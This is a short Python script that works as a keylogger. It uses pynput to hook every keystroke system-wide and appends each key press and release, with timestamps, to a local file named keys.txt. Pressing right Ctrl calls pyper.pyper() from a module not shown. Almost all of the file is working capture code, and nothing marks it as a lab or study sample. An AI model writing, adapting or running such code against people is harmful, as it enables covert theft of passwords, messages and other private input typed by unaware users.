from time import ctime as Current_time
from pynput import keyboard
import pyper


def key_name(key):
    if isinstance(key, keyboard.KeyCode):

        return key.char
    else:
        return str(key)


def pressed(key):
    KeyName = key_name(key)
    __SpecialKeyName__ = f"[{KeyName} : pressed on : {Current_time()}]\n"
    LogFile = open("keys.txt", "a")

    if len(KeyName) > 1:
        LogFile.write(str(__SpecialKeyName__))
        # print(__SpecialKeyName__)

    if (KeyName == 'Key.ctrl_r'):
        pyper.pyper()
    else:
        pass


def released(key):

    KeyName = key_name(key)
    LogFile = open("keys.txt", "a")

    __KeyName__ = f"[{KeyName} : on :  {Current_time()}]\n"
    __SpecialKeyName__ = f"[{KeyName} : released on : {Current_time()}]\n"

    if len(KeyName) == 1:
        LogFile.write(str(__KeyName__))

        # print(__KeyName__)

    else:
        LogFile.write(str(__SpecialKeyName__))

        # print(__SpecialKeyName__)


with keyboard.Listener(on_press=pressed, on_release=released) as listener:
    listener.join()
